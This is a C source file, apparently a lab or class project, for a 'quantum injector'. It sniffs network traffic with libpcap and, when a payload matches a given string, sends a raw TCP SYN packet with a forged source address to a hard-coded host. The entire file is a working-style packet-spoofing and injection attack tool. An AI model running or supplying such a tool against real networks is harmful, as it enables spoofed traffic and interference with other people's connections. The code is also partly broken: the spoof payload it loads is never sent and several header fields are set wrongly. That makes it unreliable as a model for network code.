#include <pcap.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <assert.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define ETHER_ADDR_LEN 6
#define SIZE_ETHERNET 14
#define ETHERTYPE_ARP 0x0806
#define ETHERTYPE_IPV4 0x0800

typedef enum { false, true } boolean;

unsigned char *spoof_payload = NULL;

char* read_file(const char* filename) {
	char *buffer = 0;
	long length;
	FILE *f = fopen (filename, "rb");
	
	if (f) {
		fseek (f, 0, SEEK_END);
		length = ftell (f);
		fseek (f, 0, SEEK_SET);
		buffer = malloc (length);
		if (buffer)
			fread (buffer, 1, length, f);
		fclose (f);
	} else
		return 0;
	
	return buffer;
}

// define necessary struct for headers
/* Ethernet header */
struct sniff_ethernet
{
	u_char  ether_dhost[ETHER_ADDR_LEN];	/* destination host address */
	u_char  ether_shost[ETHER_ADDR_LEN];	/* source host address */
	u_short ether_type;					 /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip
{
	u_char  ip_hl:4, ip_v:4;				 /* version << 4 | header length >> 2 */
	u_char  ip_tos;				 /* type of service */
	u_short ip_len;				 /* total length */
	u_short ip_id;				  /* identification */
	u_short ip_off;				 /* fragment offset field */
#define IP_RF 0x8000			/* reserved fragment flag */
#define IP_DF 0x4000			/* dont fragment flag */
#define IP_MF 0x2000			/* more fragments flag */
#define IP_OFFMASK 0x1fff	   /* mask for fragmenting bits */
	u_char  ip_ttl;				 /* time to live */
	u_char  ip_p;				   /* protocol */
	u_short ip_sum;				 /* checksum */
	struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp
{
	u_short th_sport;			   /* source port */
	u_short th_dport;			   /* destination port */
	tcp_seq th_seq;				 /* sequence number */
	tcp_seq th_ack;				 /* acknowledgement number */
	u_char  th_x2:4, th_off:4;			   /* data offset, rsvd */
	u_char  th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS		(TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;				 /* window */
	u_short th_sum;				 /* checksum */
	u_short th_urp;				 /* urgent pointer */
};

// for generating checksum of packet
unsigned short csum (unsigned short *buf, int nwords) {
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

int send_spoof_packet () {
	int raw_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	char datagram[4096];
	struct sniff_ip *ip_header = (struct sniff_ip *)datagram;
	struct sniff_tcp *tcp_header = (struct sniff_tcp *)(datagram + sizeof(struct sniff_ip));
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons (25);
	sin.sin_addr.s_addr = inet_addr ("10.0.1.6");
	
	memset(datagram, 0, 4096);
	
	/* we'll now fill in the ip/tcp header values, see above for explanations */
	ip_header->ip_hl = 5;
	ip_header->ip_v = 4;
	ip_header->ip_tos = 0;
	ip_header->ip_len = sizeof(struct sniff_ip) + sizeof(struct sniff_tcp);	/* no payload */
	ip_header->ip_id = htonl (54321);	/* the value doesn't matter here */
	ip_header->ip_off = 0;
	ip_header->ip_ttl = 255;
	ip_header->ip_p = 6;
	ip_header->ip_sum = 0;		/* set it to 0 before computing the actual checksum later */
	ip_header->ip_src.s_addr = inet_addr ("8.8.8.8");/* SYN's can be blindly spoofed */
	ip_header->ip_dst.s_addr = sin.sin_addr.s_addr;
	tcp_header->th_sport = htons (1234);	/* arbitrary port */
	tcp_header->th_dport = htons (25);
	tcp_header->th_seq = random();/* in a SYN packet, the sequence is a random */
	tcp_header->th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */
	tcp_header->th_x2 = 0;
	tcp_header->th_off = 0;		/* first and only tcp segment */
	tcp_header->th_flags = TH_SYN;	/* initial connection request */
	tcp_header->th_win = htonl (65535);	/* maximum allowed window size */
	tcp_header->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
		      should fill in the correct checksum during transmission */
	tcp_header->th_urp = 0;
	
	ip_header->ip_sum = csum ((unsigned short *)datagram, ip_header->ip_len >> 1);
	
/* finally, it is very advisable to do a IP_HDRINCL call, to make sure
   that the kernel knows the header is included in the data, and doesn't
   insert its own header into the packet before our data */
	
	/* lets do it the ugly way.. */
	int one = 1;
	const int *val = &one;
	if (setsockopt (raw_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
		printf ("Warning: Cannot set HDRINCL!\n");
	
	if (sendto(raw_fd,		/* our socket */
		datagram,	/* the buffer containing headers and data */
		ip_header->ip_len,	/* total length of our datagram */
		0,		/* routing flags, normally always 0 */
		(struct sockaddr *) &sin,	/* socket addr, just like in */
		sizeof (sin)) < 0) {		/* a normal send() */
		//printf ("Send spoof packet error\n");
		close(raw_fd);
		return 0;
	} else {
		//printf ("Send spoof packet succeed!\n");
		close(raw_fd);
		return 1;
	}
}

// display info for each packet
void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;
	const struct sniff_ip *ip;
	const struct sniff_tcp *tcp;
	const char *payload;
	
	int size_ip;
	int size_tcp;
	int size_payload;
	
	// extract ethernet header
	ethernet = (struct sniff_ethernet*)(packet);
	
	if (ntohs(ethernet->ether_type) == ETHERTYPE_IPV4) {
		//printf("regexp: %s\n", args);
		//printf("IPv4 ");
		// extract ip header
		ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
		size_ip = ip->ip_hl*4;
		if (size_ip < 20) {
			printf("* Invalid IP header length: %u bytes\n", size_ip);
			return;
		}
		
		// for tcp packet
		if (ip->ip_p == IPPROTO_TCP) {
			//printf("TCP ");
			tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
			size_tcp = tcp->th_off * 4;
			if (size_tcp < 20) {
				printf("* Invalid TCP header length: %u bytes\n", size_tcp);
				return;
			}
			//printf("%s.%d -> ", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
			//printf("%s.%d ", inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));
			//printf("len %d ", ntohs(ip->ip_len));
			
			// extract payload
			payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
			size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
			
			// print payload
			if (size_payload > 0) {
				//printf("Payload (%d bytes)\n", size_payload);
				
				if (args != NULL) {
					if (strstr(payload, args) == NULL)
						return;
					else {
						// inject packet here
						printf("Found matching, inject packet!\n");
						int i = send_spoof_packet();
						if (!i) 
							printf("Send spoof packet error!\n");
						return;
					}
				} else {
					// inject packet here if no pattern specified
					printf("No pattern, inject packet!\n");
					int i = send_spoof_packet();
					if (!i) 
						printf("Send spoof packet error!\n");
					return;
				}
			} else {
				//printf("No payload\n");
				return;
			}
		} else {
			//printf("NON-TCP packet\n");
			return;
		}
		
	} else {
		//printf("NON-IPv4 packet\n");
		return;
	}
}

int main(int argc, char *argv[]) {
	int opt = 0;
	char *interface = NULL;
	char *regexp = NULL;
	char *datafile = NULL;
	char *expression = NULL;
	// this string is used for communication between this
	// program and pcap
	char errbuf[PCAP_ERRBUF_SIZE];
	// this is like file system
	pcap_t *handle;
	// compiled filter
	struct bpf_program filter;
	// The netmask of interface
	bpf_u_int32 mask;
	// The ip address of interface
	bpf_u_int32 net;
	// the struct to store packet header
	struct pcap_pkthdr header;
	// the actual packet
	const u_char *packet;
	// set counter to negative so sniffer will continue working
	int cnt = -1;

	while ((opt = getopt(argc, argv, "i:r:d:")) != -1) {
		switch(opt) {
			case 'i':
				interface = optarg;
				//printf("interface: %s\n", interface);
				break;
			case 'r':
				regexp = optarg;
				//printf("file: %s\n", file);quantumdetect
				break;
			case 'd':
				datafile = optarg;
				//printf("string: %s\n", string);
				break;
			case '?':
				// when user didn't specify argument
				if (optopt == 'i') {
					printf("Please specify interface!\n");
					return 0;
				} else if (optopt == 'r') {
					printf("Please specify regular expression!\n");
					return 0;
				} else if (optopt == 'd') {
					printf("Please specify data file!\n");
					return 0;
				} else {
					printf("Unknown argument!\n");
					return 0;
				}
			default:
				printf("Default case?!\n");
				return 0;
		}
		
	}
	
	// get expression
	if (optind == argc - 1)
		expression = argv[optind];
	else if (optind < argc -1) {
		printf("Redundant arguments. Exiting...\n");
		return 0;
	}
	
	if (datafile == NULL) {
		printf("Please use -d to specify the data file you want to use as the spoofed payload!\n");
		return 0;
	}
	
	if (interface == NULL) {
		interface = pcap_lookupdev(errbuf);
		//interface = NULL;
		if (interface == NULL) {
			printf("Error getting default device! Error message: %s\n\
			Exiting...\n", errbuf);
			return 0;
		}
	}
	
	printf("\n\tInitializing quantum injector using following parameters:\n\
		interface: %s\n\
		regular expression: %s\n\
		data file: %s\n\
		expression: %s\n\n\n", interface, regexp, datafile, expression);
	
	// open interface here
	if (interface != NULL) {
		// Get ip and netmask of sniffing interface or file
		if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
			printf("Error getting ip and mask of the interface! Error message: %s\n", errbuf);
			net = 0;
			mask = 0;
		}
		// Start pcap session
		handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			printf("Error opening live! Error message: %s\n\
			Existing...\n", errbuf);
			return 0;
		}
	} else {
		printf("Interface not specified when initializing! Existing...\n");
		return 0;
	}
	
	// read payload file
	spoof_payload = read_file(datafile);
	if (!spoof_payload) {
		printf("read data file failed!\n");
		return 0;
	}
	
	// check if link-layer header is ethernet
	if (pcap_datalink(handle) != DLT_EN10MB) {
		printf("Interface %s doesn't using ethernet header! Existing\n", interface);
		return 0;
	}
	
	// compile and apply expression
	if (expression != NULL) {
		// compile filter string
		if (pcap_compile(handle, &filter, expression, 0, net) == -1) {
			printf("Error compiling expression! Error message: %s\n\
			Existing...\n", pcap_geterr(handle));
			return 0;
		}
		// apply compiled filter to session
		if (pcap_setfilter(handle, &filter) == -1) {
			printf("Error applying expression! Error message: %s\n\
			Existing...\n", pcap_geterr(handle));
			return 0;
		}
	}
	
	// now we start sniffing!
	pcap_loop(handle, cnt, handle_packet, regexp);
	
	//pcap_freecode(&filter);
	pcap_close(handle);
	printf("\n\t... ... the end ... ...\n\n");
	return 0;
}